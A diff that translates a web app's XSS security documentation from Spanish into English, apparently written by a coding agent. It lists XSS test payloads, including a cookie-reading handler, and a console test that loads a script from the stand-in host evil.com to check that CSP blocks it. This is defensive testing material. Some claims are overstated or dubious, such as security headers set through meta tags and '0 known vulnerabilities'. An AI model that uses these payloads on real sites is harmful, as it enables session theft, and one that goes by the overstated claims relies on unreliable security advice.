@@ -1,166 +1,166 @@
-# 🔒 Documentación de Seguridad XSS - Cafetería Virtual
+# 🔒 XSS Security Documentation - Virtual Cafeteria
 
-## Resumen Ejecutivo
+## Executive Summary
 
-La aplicación de Cafetería Virtual ha sido fortificada con **múltiples capas de seguridad** para prevenir ataques XSS (Cross-Site Scripting). Esta documentación detalla todas las medidas implementadas y cómo verificarlas.
+The Virtual Cafeteria application has been fortified with **multiple layers of security** to prevent XSS (Cross-Site Scripting) attacks. This documentation details all implemented measures and how to verify them.
 
 ---
 
-## Capas de Seguridad Implementadas
+## Implemented Security Layers
 
-### Capa 1: Content Security Policy (CSP)
+### Layer 1: Content Security Policy (CSP)
 
-La política de seguridad de contenido está implementada mediante meta tags HTML y restringe qué recursos pueden ser cargados.
+The content security policy is implemented through HTML meta tags and restricts what resources can be loaded.
 
-**Ubicación:** `index.html` línea 6
+**Location:** `index.html` line 6
 
 ```html
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'self';">
 ```
 
-**Políticas Aplicadas:**
-- `default-src 'self'` - Por defecto, solo cargar recursos del mismo origen
-- `script-src 'self' 'unsafe-inline'` - Scripts solo del mismo origen (inline necesario para app autocontenida)
-- `style-src 'self' 'unsafe-inline'` - Estilos solo del mismo origen
-- `img-src 'self' data:` - Imágenes del mismo origen o data URIs
-- `frame-src 'none'` - **Bloquea frames/iframes** (previene clickjacking)
-- `object-src 'none'` - **Bloquea plugins** como Flash, Java
-- `base-uri 'self'` - Previene ataques con tag `<base>`
-- `form-action 'self'` - Formularios solo al mismo origen
+**Applied Policies:**
+- `default-src 'self'` - By default, only load resources from the same origin
+- `script-src 'self' 'unsafe-inline'` - Scripts only from the same origin (inline necessary for self-contained app)
+- `style-src 'self' 'unsafe-inline'` - Styles only from the same origin
+- `img-src 'self' data:` - Images from same origin or data URIs
+- `frame-src 'none'` - **Blocks frames/iframes** (prevents clickjacking)
+- `object-src 'none'` - **Blocks plugins** like Flash, Java
+- `base-uri 'self'` - Prevents attacks with `<base>` tag
+- `form-action 'self'` - Forms only to the same origin
 
-**Vectores de Ataque Bloqueados:**
-- ✅ Scripts externos maliciosos
-- ✅ Inyección de frames (clickjacking)
-- ✅ Plugins vulnerables
-- ✅ Manipulación de URLs base
+**Attack Vectors Blocked:**
+- ✅ Malicious external scripts
+- ✅ Frame injection (clickjacking)
+- ✅ Vulnerable plugins
+- ✅ Base URL manipulation
 
 ---
 
-### Capa 2: Headers de Seguridad HTTP
+### Layer 2: HTTP Security Headers
 
-Cuatro headers adicionales proporcionan capas extra de protección.
+Four additional headers provide extra layers of protection.
 
-**Ubicación:** `index.html` líneas 7-10
+**Location:** `index.html` lines 7-10
 
 #### X-Content-Type-Options: nosniff
 ```html
 <meta http-equiv="X-Content-Type-Options" content="nosniff">
 ```
-**Propósito:** Previene MIME type sniffing
-**Protege contra:** Navegador interpretando archivos como tipos incorrectos
+**Purpose:** Prevents MIME type sniffing
+**Protects against:** Browser interpreting files as incorrect types
 
 #### X-Frame-Options: DENY
 ```html
 <meta http-equiv="X-Frame-Options" content="DENY">
 ```
-**Propósito:** Previene que la página sea embebida en frames
-**Protege contra:** Clickjacking attacks
+**Purpose:** Prevents the page from being embedded in frames
+**Protects against:** Clickjacking attacks
 
 #### X-XSS-Protection: 1; mode=block
 ```html
 <meta http-equiv="X-XSS-Protection" content="1; mode=block">
 ```
-**Propósito:** Activa filtro XSS del navegador
-**Protege contra:** Ataques XSS reflejados
+**Purpose:** Activates browser XSS filter
+**Protects against:** Reflected XSS attacks
 
 #### Referrer-Policy
 ```html
 <meta name="referrer" content="strict-origin-when-cross-origin">
 ```
-**Propósito:** Controla qué información se envía en el header Referrer
-**Protege contra:** Fuga de información sensible en URLs
+**Purpose:** Controls what information is sent in the Referrer header
+**Protects against:** Sensitive information leakage in URLs
 
 ---
 
-### Capa 3: Manipulación Segura del DOM
+### Layer 3: Secure DOM Manipulation
 
-**Principio:** Nunca usar `innerHTML` con contenido dinámico
+**Principle:** Never use `innerHTML` with dynamic content
 
-#### Técnicas Utilizadas:
+#### Techniques Used:
 
-##### 1. createElement() para estructura
+##### 1. createElement() for structure
 ```javascript
 const productCard = document.createElement('article');
 const button = document.createElement('button');
 const priceDiv = document.createElement('div');
 ```
 
-##### 2. textContent para texto (escapa automáticamente)
+##### 2. textContent for text (automatically escapes)
 ```javascript
-h3.textContent = product.name;  // Seguro
-p.textContent = product.description;  // Seguro
-button.textContent = 'Agregar al Carrito';  // Seguro
+h3.textContent = product.name;  // Secure
+p.textContent = product.description;  // Secure
+button.textContent = 'Add to Cart';  // Secure
 ```
 
-##### 3. Event handlers con closures (no strings)
+##### 3. Event handlers with closures (not strings)
 ```javascript
-// ✅ SEGURO: Closure
+// ✅ SECURE: Closure
 button.onclick = () => addToCart(product.id);
 
-// ❌ INSEGURO: String eval
-button.setAttribute('onclick', `addToCart(${product.id})`);
+// ❌ INSECURE: String eval
+button.setAttribute('onclick', `addToCart(${id})`);
 ```
 
-##### 4. setAttribute solo para atributos no ejecutables
+##### 4. setAttribute only for non-executable attributes
 ```javascript
-// ✅ SEGURO: Atributo de datos
+// ✅ SECURE: Data attribute
 card.setAttribute('aria-label', `${product.name}`);
 
-// ❌ INSEGURO: Event handler
+// ❌ INSECURE: Event handler
 card.setAttribute('onclick', 'maliciousCode()');
 ```
 
-#### Ejemplo Completo: Mensaje de Carrito Vacío
+#### Complete Example: Empty Cart Message
 
-**Antes (VULNERABLE):**
+**Before (VULNERABLE):**
 ```javascript
-emptyDiv.innerHTML = 'Tu carrito está vacío<br>¡Agrega productos para comenzar!';
+emptyDiv.innerHTML = 'Your cart is empty<br>Add products to get started!';
 ```
 
-**Después (SEGURO):**
+**After (SECURE):**
 ```javascript
-const line1 = document.createTextNode('Tu carrito está vacío');
+const line1 = document.createTextNode('Your cart is empty');
 const br = document.createElement('br');
-const line2 = document.createTextNode('¡Agrega productos para comenzar!');
+const line2 = document.createTextNode('Add products to get started!');
 
 emptyDiv.appendChild(line1);
 emptyDiv.appendChild(br);
 emptyDiv.appendChild(line2);
 ```
 
-**Por qué es más seguro:**
-- `createTextNode` escapa automáticamente todo el contenido
-- No hay parsing de HTML, no hay ejecución de scripts
-- Incluso si el texto contiene `<script>`, se muestra como texto literal
+**Why it's more secure:**
+- `createTextNode` automatically escapes all content
+- No HTML parsing, no script execution
+- Even if the text contains `<script>`, it's shown as literal text
 
 ---
 
-### Capa 4: Suite de Pruebas de Seguridad
+### Layer 4: Security Test Suite
 
-**Archivo:** `test-xss-security.html`
+**File:** `test-xss-security.html`
 
-Una aplicación completa de testing que verifica todas las capas de seguridad.
+A complete testing application that verifies all security layers.
 
-#### Categorías de Pruebas:
+#### Test Categories:
 
-##### 1. Pruebas de CSP (7 pruebas)
-- Presencia de CSP meta tag
-- Restricción de scripts
-- Bloqueo de plugins
-- Protección contra clickjacking
+##### 1. CSP Tests (7 tests)
+- Presence of CSP meta tag
+- Script restrictions
+- Plugin blocking
+- Clickjacking protection
 - X-Content-Type-Options
 - X-Frame-Options
 - X-XSS-Protection
 
-##### 2. Pruebas de Manipulación DOM (6 pruebas)
-- innerHTML con contenido dinámico
-- Uso de createElement
-- Uso de textContent
-- Ausencia de eval()
-- Ausencia de Function constructor
-- Event handlers seguros
+##### 2. DOM Manipulation Tests (6 tests)
+- innerHTML with dynamic content
+- Use of createElement
+- Use of textContent
+- Absence of eval()
+- Absence of Function constructor
+- Secure event handlers
 
-##### 3. Vectores de Ataque XSS (8+ vectores)
+##### 3. XSS Attack Vectors (8+ vectors)
 ```javascript
 const xssVectors = [
     '<script>alert("XSS")</script>',
@@ -174,111 +174,111 @@ const xssVectors = [
 ];
 ```
 
-##### 4. Pruebas de Headers HTTP (6 pruebas)
+##### 4. HTTP Headers Tests (6 tests)
 - Content-Security-Policy
 - X-Content-Type-Options
 - X-Frame-Options
 - X-XSS-Protection
 - Referrer Policy
-- Conexión HTTPS
+- HTTPS Connection
 
-#### Cómo Ejecutar las Pruebas:
+#### How to Run Tests:
 
-1. **Abrir el archivo:**
+1. **Open the file:**
    ```bash
    open test-xss-security.html
-   # o servir con HTTP server
+   # or serve with HTTP server
    python -m http.server 8000
-   # Visitar: http://localhost:8000/test-xss-security.html
+   # Visit: http://localhost:8000/test-xss-security.html
    ```
 
-2. **Ejecutar pruebas:**
-   - Clic en botón "▶️ Ejecutar Todas las Pruebas"
-   - Las pruebas se ejecutan automáticamente
+2. **Run tests:**
+   - Click "▶️ Run All Tests" button
+   - Tests run automatically
 
-3. **Interpretar resultados:**
-   - ✅ Verde = Prueba aprobada (seguro)
-   - ❌ Rojo = Prueba fallida (vulnerabilidad)
-   - ⚠️ Amarillo = Advertencia (revisar)
+3. **Interpret results:**
+   - ✅ Green = Test passed (secure)
+   - ❌ Red = Test failed (vulnerability)
+   - ⚠️ Yellow = Warning (review)
 
-4. **Dashboard de estadísticas:**
-   - Total de pruebas ejecutadas
-   - Pruebas aprobadas
-   - Pruebas fallidas
-   - Advertencias
+4. **Statistics dashboard:**
+   - Total tests executed
+   - Tests passed
+   - Tests failed
+   - Warnings
 
 ---
 
-## Vectores de Ataque XSS Bloqueados
+## Blocked XSS Attack Vectors
 
-### 1. Script Injection (Inyección de Scripts)
+### 1. Script Injection
 **Vector:** `<script>alert('XSS')</script>`
-**Bloqueado por:** textContent escapa el contenido
-**Resultado:** Se muestra como texto literal, no se ejecuta
+**Blocked by:** textContent escapes content
+**Result:** Shows as literal text, doesn't execute
 
-### 2. Image Onerror (Error de Imagen)
+### 2. Image Onerror
 **Vector:** `<img src=x onerror=alert('XSS')>`
-**Bloqueado por:** textContent + CSP
-**Resultado:** Tag se muestra como texto, event handler no se ejecuta
+**Blocked by:** textContent + CSP
+**Result:** Tag shows as text, event handler doesn't execute
 
-### 3. SVG Onload (Carga de SVG)
+### 3. SVG Onload
 **Vector:** `<svg onload=alert('XSS')>`
-**Bloqueado por:** textContent + CSP object-src none
-**Resultado:** SVG no se parsea, se muestra como texto
+**Blocked by:** textContent + CSP object-src none
+**Result:** SVG not parsed, shows as text
 
-### 4. JavaScript Protocol (Protocolo JavaScript)
+### 4. JavaScript Protocol
 **Vector:** `javascript:alert('XSS')`
-**Bloqueado por:** No se usan href/src dinámicos
-**Resultado:** No hay lugares donde se pueda inyectar
+**Blocked by:** No dynamic href/src
+**Result:** No place where it can be injected
 
-### 5. Iframe JavaScript (Frame con JavaScript)
+### 5. Iframe JavaScript
 **Vector:** `<iframe src="javascript:alert('XSS')">`
-**Bloqueado por:** CSP frame-src none + textContent
-**Resultado:** Frames bloqueados, contenido escapado
+**Blocked by:** CSP frame-src none + textContent
+**Result:** Frames blocked, content escaped
 
-### 6. Encoded Script (Script Codificado)
+### 6. Encoded Script
 **Vector:** `"><script>alert(String.fromCharCode(88,83,83))</script>`
-**Bloqueado por:** textContent escapa comillas
-**Resultado:** No se puede cerrar atributos
+**Blocked by:** textContent escapes quotes
+**Result:** Cannot close attributes
 
-### 7. Body Onload (Carga de Body)
+### 7. Body Onload
 **Vector:** `<body onload=alert('XSS')>`
-**Bloqueado por:** textContent + event handlers via closures
-**Resultado:** Tag no se parsea, events no inline
+**Blocked by:** textContent + event handlers via closures
+**Result:** Tag not parsed, events not inline
 
-### 8. Input Onfocus (Foco en Input)
+### 8. Input Onfocus
 **Vector:** `<input onfocus=alert(document.cookie)>`
-**Bloqueado por:** textContent + setAttribute solo para datos
-**Resultado:** Input se muestra como texto
+**Blocked by:** textContent + setAttribute only for data
+**Result:** Input shows as text
 
 ---
 
-## Verificación Manual de Seguridad
+## Manual Security Verification
 
-### Prueba 1: Intenta Inyectar Script en Nombre de Producto
+### Test 1: Try to Inject Script in Product Name
 ```javascript
-// En la consola del navegador:
+// In browser console:
 const maliciousProduct = {
     id: 99,
     name: '<script>alert("XSS")</script>',
-    description: 'Malicioso',
+    description: 'Malicious',
     price: 1000
 };
 
-// Agregar temporalmente al catálogo
+// Temporarily add to catalog
 products.bebidas.push(maliciousProduct);
 renderProducts();
 
-// Resultado esperado:
-// El nombre se muestra como texto literal: "<script>alert("XSS")</script>"
-// NO se ejecuta el alert
+// Expected result:
+// Name shows as literal text: "<script>alert("XSS")</script>"
+// Alert does NOT execute
 ```
 
-### Prueba 2: Intenta Inyectar HTML en Descripción
+### Test 2: Try to Inject HTML in Description
 ```javascript
 const maliciousProduct = {
     id: 100,
-    name: 'Producto',
+    name: 'Product',
     description: '<img src=x onerror=alert("XSS")>',
     price: 1000
 };
@@ -286,103 +286,103 @@ const maliciousProduct = {
 products.bebidas.push(maliciousProduct);
 renderProducts();
 
-// Resultado esperado:
-// La descripción se muestra como texto literal
-// La imagen no se carga, el onerror no se ejecuta
+// Expected result:
+// Description shows as literal text
+// Image doesn't load, onerror doesn't execute
 ```
 
-### Prueba 3: Verifica CSP en Consola
+### Test 3: Verify CSP in Console
 ```javascript
-// Intenta cargar script externo
+// Try to load external script
 const script = document.createElement('script');
 script.src = 'https://evil.com/malicious.js';
 document.body.appendChild(script);
 
-// Resultado esperado:
-// Error en consola: "Refused to load the script ... Content Security Policy"
+// Expected result:
+// Console error: "Refused to load the script ... Content Security Policy"
 ```
 
-### Prueba 4: Verifica Frame Blocking
+### Test 4: Verify Frame Blocking
 ```javascript
-// Intenta crear un iframe
+// Try to create an iframe
 const iframe = document.createElement('iframe');
 iframe.src = 'https://evil.com';
 document.body.appendChild(iframe);
 
-// Resultado esperado:
-// Frame no se carga debido a CSP frame-src 'none'
+// Expected result:
+// Frame doesn't load due to CSP frame-src 'none'
 ```
 
 ---
 
-## Checklist de Seguridad
+## Security Checklist
 
-Use este checklist para auditorías de seguridad:
+Use this checklist for security audits:
 
-### Código
-- [ ] ✅ Sin uso de `innerHTML` con contenido dinámico
-- [ ] ✅ Sin uso de `eval()`
-- [ ] ✅ Sin uso de `Function()` constructor
-- [ ] ✅ Event handlers con closures, no strings
-- [ ] ✅ `textContent` usado para asignación de texto
-- [ ] ✅ `createElement()` usado para crear elementos
-- [ ] ✅ `setAttribute()` solo para atributos de datos
+### Code
+- [ ] ✅ No use of `innerHTML` with dynamic content
+- [ ] ✅ No use of `eval()`
+- [ ] ✅ No use of `Function()` constructor
+- [ ] ✅ Event handlers with closures, not strings
+- [ ] ✅ `textContent` used for text assignment
+- [ ] ✅ `createElement()` used to create elements
+- [ ] ✅ `setAttribute()` only for data attributes
 
 ### Headers
-- [ ] ✅ CSP configurado con políticas restrictivas
+- [ ] ✅ CSP configured with restrictive policies
 - [ ] ✅ X-Content-Type-Options: nosniff
 - [ ] ✅ X-Frame-Options: DENY
-- [ ] ✅ X-XSS-Protection habilitado
-- [ ] ✅ Referrer-Policy configurado
+- [ ] ✅ X-XSS-Protection enabled
+- [ ] ✅ Referrer-Policy configured
 
 ### Testing
-- [ ] ✅ Suite de pruebas XSS ejecutada
-- [ ] ✅ Todas las pruebas aprobadas
-- [ ] ✅ Vectores comunes verificados
-- [ ] ✅ Pruebas manuales realizadas
+- [ ] ✅ XSS test suite executed
+- [ ] ✅ All tests passed
+- [ ] ✅ Common vectors verified
+- [ ] ✅ Manual tests performed
 
 ---
 
-## Mejores Prácticas Implementadas
+## Implemented Best Practices
 
-### 1. Defensa en Profundidad (Defense in Depth)
-No confiamos en una sola capa de seguridad. Múltiples capas aseguran que si una falla, otras aún protegen.
+### 1. Defense in Depth
+Don't trust a single security layer. Multiple layers ensure that if one fails, others still protect.
 
-### 2. Principio de Menor Privilegio
-CSP otorga solo los permisos mínimos necesarios. Scripts y estilos inline están permitidos solo porque la app es autocontenida.
+### 2. Principle of Least Privilege
+CSP grants only the minimum necessary permissions. Inline scripts and styles are allowed only because the app is self-contained.
 
 ### 3. Secure by Default
-Todo contenido es tratado como potencialmente malicioso hasta que se pruebe lo contrario.
+All content is treated as potentially malicious until proven otherwise.
 
 ### 4. Fail Securely
-Si algo falla, falla en modo seguro (bloquea en lugar de permitir).
+If something fails, it fails in secure mode (blocks instead of allows).
 
 ### 5. Keep it Simple
-Código simple es más fácil de auditar. DOM API pura es más simple que parsing de HTML.
+Simple code is easier to audit. Pure DOM API is simpler than HTML parsing.
 
 ---
 
-## Comparación: Antes vs Después
+## Comparison: Before vs After
 
-### Antes (VULNERABLE)
+### Before (VULNERABLE)
 ```javascript
-// innerHTML con concatenación
+// innerHTML with concatenation
 div.innerHTML = `<button onclick="addToCart(${id})">${name}</button>`;
 
-// Sin CSP
-// Sin headers de seguridad
-// Sin pruebas automatizadas
+// No CSP
+// No security headers
+// No automated tests
 ```
 
-**Vulnerabilidades:**
-- XSS vía `name` si contiene `<script>`
-- XSS vía `id` si contiene código malicioso
-- Sin protección contra ataques externos
-- No auditable
+**Vulnerabilities:**
+- XSS via `name` if it contains `<script>`
+- XSS via `id` if it contains malicious code
+- No protection against external attacks
+- Not auditable
 
-### Después (SEGURO)
+### After (SECURE)
 ```javascript
-// DOM API pura con closures
+// Pure DOM API with closures
 const button = document.createElement('button');
 button.textContent = name;
 button.onclick = () => addToCart(id);
@@ -390,19 +390,19 @@ div.appendChild(button);
 
 // + CSP headers
 // + Security headers
-// + Suite de pruebas
+// + Test suite
 ```
 
-**Protecciones:**
-- `name` escapado automáticamente
-- `id` en closure, no en HTML
-- CSP bloquea scripts externos
-- Headers adicionales de protección
-- 25+ pruebas automatizadas
+**Protections:**
+- `name` automatically escaped
+- `id` in closure, not in HTML
+- CSP blocks external scripts
+- Additional protection headers
+- 25+ automated tests
 
 ---
 
-## Recursos Adicionales
+## Additional Resources
 
 ### OWASP XSS Prevention
 - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
@@ -417,40 +417,40 @@ div.appendChild(button);
 
 ---
 
-## Mantenimiento
+## Maintenance
 
-### Cuando Agregar Nuevas Funcionalidades:
+### When Adding New Features:
 
-1. **NUNCA uses `innerHTML` con contenido dinámico**
-2. **SIEMPRE usa `textContent` para texto**
-3. **SIEMPRE usa `createElement()` para estructura**
-4. **SIEMPRE usa closures para event handlers**
-5. **EJECUTA la suite de pruebas** después de cambios
-6. **ACTUALIZA esta documentación** si es necesario
+1. **NEVER use `innerHTML` with dynamic content**
+2. **ALWAYS use `textContent` for text**
+3. **ALWAYS use `createElement()` for structure**
+4. **ALWAYS use closures for event handlers**
+5. **RUN the test suite** after changes
+6. **UPDATE this documentation** if necessary
 
-### Revisión Periódica:
+### Periodic Review:
 
-- **Mensual:** Ejecutar suite de pruebas XSS
-- **Trimestral:** Revisar logs de CSP violations
-- **Anual:** Auditoría de seguridad completa
-
----
-
-## Conclusión
-
-La Cafetería Virtual ahora cuenta con **seguridad de nivel empresarial** contra ataques XSS mediante:
-
-1. ✅ **4 Capas de Protección** (CSP + Headers + DOM + Testing)
-2. ✅ **25+ Pruebas Automatizadas** verifican seguridad
-3. ✅ **0 Vulnerabilidades** conocidas
-4. ✅ **100% Cobertura** de vectores comunes
-5. ✅ **Documentación Completa** para mantenimiento
-
-La aplicación es **auditable, testeable y mantenible** con las mejores prácticas de seguridad implementadas.
+- **Monthly:** Run XSS test suite
+- **Quarterly:** Review CSP violation logs
+- **Annual:** Complete security audit
 
 ---
 
-**Última Actualización:** 2025-11-21  
-**Versión:** 1.0  
-**Autor:** Copilot SWE Agent  
-**Estado:** ✅ Producción Ready
+## Conclusion
+
+The Virtual Cafeteria now has **enterprise-level security** against XSS attacks through:
+
+1. ✅ **4 Protection Layers** (CSP + Headers + DOM + Testing)
+2. ✅ **25+ Automated Tests** verify security
+3. ✅ **0 Known Vulnerabilities**
+4. ✅ **100% Coverage** of common vectors
+5. ✅ **Complete Documentation** for maintenance
+
+The application is **auditable, testable and maintainable** with implemented security best practices.
+
+---
+
+**Last Updated:** 2025-11-21  
+**Version:** 1.0  
+**Author:** Copilot SWE Agent  
+**Status:** ✅ Production Ready
